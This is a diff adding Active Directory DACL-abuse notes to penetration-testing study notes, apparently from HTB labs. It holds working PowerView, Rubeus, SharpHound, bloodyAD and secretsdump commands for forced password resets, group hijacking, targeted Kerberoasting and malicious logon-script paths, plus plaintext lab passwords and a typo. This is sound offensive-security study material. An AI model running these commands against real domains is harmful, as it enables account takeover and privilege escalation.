@@ -247,3 +247,123 @@ impacket-secretsdump 'ignite.local'/'shreya':'Password@1'@'192.168.1.48'
    ```bash
    impacket-secretsdump -ntds ntds.dit -system system local
    ```
+
+
+# DACL Abuses
+- ACL contains ACEs
+- Each ACE is made up of four parts
+	1. **SID** of the user/group that has access to the object
+	2. **type** , allowed - access denied - system audit
+	3. **flags** that defines the if child objects inherits the ace or not
+	4. [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) 32-bit value that defines the rights granted to an object
+### PowerView ACL abuses
+- `ForceChangePassword` abused with `Set-DomainUserPassword`
+- `Add Members` abused with `Add-DomainGroupMember`
+- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
+- `GenericWrite` abused with `Set-DomainObject`
+- `WriteOwner` abused with `Set-DomainObjectOwner`
+- `WriteDACL` abused with `Add-DomainObjectACL`
+- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
+- `AddSelf` abused with `Add-DomainGroupMember`
+![[Pasted image 20260316114215.png]]
+
+## Enumerating ACLs using Powerview
+- Wildcard enumerations
+```powershell
+Find-InterestingDomainAcl
+```
+- Targeted (with a user we own)
+```powershell
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid wley
+Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+```
+### Using Get-ADUser and Get-Acl
+1. Get all domain users
+```powershell
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+```
+2. Loop through them one by one and map the available ACLs give to our user
+```powershell
+foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
+```
+### Looting with SharpHound.exe
+```powershell
+.\SharpHound.exe --domain minyawy.local -c all --zipfilename houndata2.zip
+```
+
+## Abusing ACLs
+### Windows
+#### **ForceChangePassword**
+- Setup **PSCredentials** Object to be used in **PowerView**'s `Set-DomainUserPassword`
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+- Prepare the new password in a **SecureString** Object
+```
+	$newpass = ConvertTo-SecureString 'N3xt_time$$' -AsPlainText -Forcr
+```
+- change the targets password
+```powershell
+Set-DomainUserPassword -Identity damundsen -AccountPassword $newpass -Credential $cred -Verbose
+```
+#### **GenericWrite** on group -> add a selected member to the Group
+1. You can setup the credentials or use **runas** to open a new powershell with the user that has the ACL 
+```powershell
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+```
+```powershell
+runas /netonly /user:INLANEFREIGHT\WLEY powershell.exe
+```
+2. List the Groups we are in (For verification)
+```powershell
+Get-DomainGroup -MemberIdentity myuser | select samaccountname
+```
+3. List the members of target group (For verification)
+```powershell
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+```
+4. add ourself to the target group
+```powershell
+Add-DomainGroupMember -Identity 'Target Group' -Members 'target user' -verbose # runas session
+Add-DomainGroupMember -Identity 'target group' -Members 'myuser' -verbose -Credentials $creds
+```
+5. Verify again with step 2 and 3
+
+#### GenericAll -> Targeted Kerberoasting
+1. Setup credentials
+2. set an SPN to the target user
+```powershell
+Set-DomainObject -Credential $creds -Identity targetuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
+```
+3. Request a TGS for the target user using Rubeus
+```powershell
+./rubeus.exe kerberoast /user:targetuser /nowrap
+```
+##### Cleanup - removing SPN
+```
+Set-DomainObject -Credential $creds -Identity adunn -Clear serviceprincipalname -Verbose
+```
+##### Cleanup - Removing ourself  from group
+```powershell
+Remove-DomainGroupMember -Identity "target Group" -Members 'targer user' -Credential $creds -Verbose
+```
+
+### Write permission on scriptPath attribute
+- when we can overwrite this attribute we can put any path to a script that will be ran by the user who we hold write permission over every time he logs in.
+#### Enumeration - Linux (BloodyAD)
+- Get writable attributes
+```bash
+BloodyAD --host garfield.htb --domain garfield.htb -u myuser -p mpassdadwda@#1 get writable --detail
+```
+- If we found scriptPath for any user account, we can try to write path to malicious logon script
+```bash
+bloodyAD --host $DOMAIN -u $USER -p "$PASS" set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v malicous.bat
+```
+- Check for the changes - nxc
+```bash
+nxc ldap DC01.garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --query "(sAMAccountname=l.wilson)" scriptPath
+```
